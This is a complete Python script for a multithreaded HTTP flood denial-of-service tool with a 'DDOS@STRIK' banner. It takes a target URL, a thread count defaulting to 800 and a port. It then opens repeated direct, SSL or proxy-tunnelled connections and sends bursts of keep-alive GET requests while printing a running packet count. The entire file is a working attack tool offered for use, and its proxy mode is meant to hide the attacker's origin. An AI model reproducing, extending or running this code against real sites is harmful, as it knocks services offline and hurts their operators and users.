#!/usr/bin/env python3
import socket, threading, sys, time, re, os, random, ssl

# --- Palette Colors ---
G, W, R, Y, D, C, M = '\033[92m', '\033[97m', '\033[91m', '\033[93m', '\033[90m', '\033[36m', '\033[95m'
RESET = '\033[0m'

def show_logo():
    os.system('clear')
    print(f"""
{R} ██████╗ ██████╗  ██████╗ ███████╗
{R} ██╔══██╗██╔══██╗██╔═══██╗██╔════╝
{R} ██║  ██║██║  ██║██║   ██║███████╗
{R} ██║  ██║██║  ██║██║   ██║╚════██║
{R} ██████╔╝██████╔╝╚██████╔╝███████║
{R} ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝{RESET}
{D} ----------------------------------- {RESET}""")

def is_valid_url(url):
    pattern = re.compile(r'^(?:http|ftp)s?://(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|localhost|\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})(?::\d+)?(?:/?|[/?]\S+)$', re.IGNORECASE)
    check_url = url if "://" in url else "http://" + url
    return re.match(pattern, check_url) is not None

show_logo()

print(f"{D} Quick cmd: DDOS [url] t [threads] s [port]{RESET}")
raw_input = input(f"{R}DDOS{G}@{W}STRIK{D}$ {RESET}").strip()
if not raw_input: sys.exit()

target_url, thread_count, custom_port = "", 800, None
parts = raw_input.split()
if parts[0].upper() == "DDOS":
    if len(parts) > 1: target_url = parts[1]
    if "t" in parts:
        try: thread_count = int(parts[parts.index("t") + 1])
        except: pass
    if "s" in parts:
        try: custom_port = int(parts[parts.index("s") + 1])
        except: pass
else: target_url = parts[0]

if not is_valid_url(target_url):
    print(f"\n{R}[!] ERROR: Invalid URL!{RESET}"); sys.exit()

use_ssl = target_url.startswith("https")
port = custom_port if custom_port else (443 if use_ssl else 80)
url_clean = target_url.replace("http://", "").replace("https://", "")
target, path = url_clean.split("/")[0], "/" + "/".join(url_clean.split("/")[1:]) if "/" in url_clean else "/"

print(f"{D} ----------------------------------- {RESET}")
print(f"{G}[1] STRIKE {R}[2] EXPLOIT {D}(Normal Mode){RESET}")
print(f"{G}[3] STRIKE {R}[4] EXPLOIT {D}(Proxy Mode){RESET}")
choice = input(f"{C}MODE > {RESET}")

if choice not in ['1', '2', '3', '4']: sys.exit()

proxies = []
if choice in ['3', '4']:
    if not os.path.exists("proxy.txt"):
        print(f"\n{R}[!] ERROR: proxy.txt not found!{RESET}"); sys.exit()
    with open("proxy.txt", "r") as f:
        proxies = [line.strip() for line in f if ":" in line]

sent_count, start_time = 0, time.time()
count_lock, stop_event = threading.Lock(), threading.Event()

def attack(mode):
    global sent_count
    while not stop_event.is_set():
        try:
            now = time.strftime("%H:%M")
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            
            if mode in ['3', '4']:
                p_h, p_p = random.choice(proxies).split(":")
                s.connect((p_h, int(p_p)))
                s.send(f"CONNECT {target}:{port} HTTP/1.1\r\n\r\n".encode())
            else:
                if use_ssl: s = ssl.create_default_context().wrap_socket(s, server_hostname=target)
                s.connect((target, port))
            
            # เปลี่ยนตัวย่อเป็น [DDOS] ตามความต้องการล่าสุด
            log_msg = f"{Y}[DDOS]{RESET}{R}({now}){RESET}{M}>>{RESET}{D}{sent_count:06d}{RESET}{M}|{RESET}{M}->{C}{target}{path}{RESET}{M}|{G}OK{RESET}\n"

            req = f"GET {path} HTTP/1.1\r\nHost: {target}\r\nConnection: keep-alive\r\n\r\n"
            for _ in range(15):
                if stop_event.is_set(): break
                s.send(req.encode('ascii'))
                with count_lock:
                    sent_count += 1
                    sys.stdout.write(log_msg)
            s.close()
        except:
            sys.stdout.write(f"{Y}[DDOS]{RESET}{R}({time.strftime('%H:%M')}){RESET}{R}!!{RESET}\n")
            time.sleep(0.1)

print(f"{D} ----------------------------------- {RESET}")
try:
    for i in range(thread_count):
        threading.Thread(target=attack, args=(choice,), daemon=True).start()
    while True: time.sleep(0.5)
except KeyboardInterrupt:
    stop_event.set()
    duration = round(time.time() - start_time, 2)
    avg_speed = round(sent_count / duration, 2) if duration > 0 else 0
    print(f"\n\n{D}-----------------------------------{RESET}")
    print(f"{R}[!] SESSION TERMINATED{RESET}")
    print(f"{W}TOTAL PACKETS SENT : {G}{sent_count}{RESET}")
    print(f"{W}TOTAL DURATION     : {C}{duration}s{RESET}")
    print(f"{W}AVERAGE SPEED      : {M}{avg_speed} p/s{RESET}")
    print(f"{D}-----------------------------------{RESET}")
    os._exit(0)
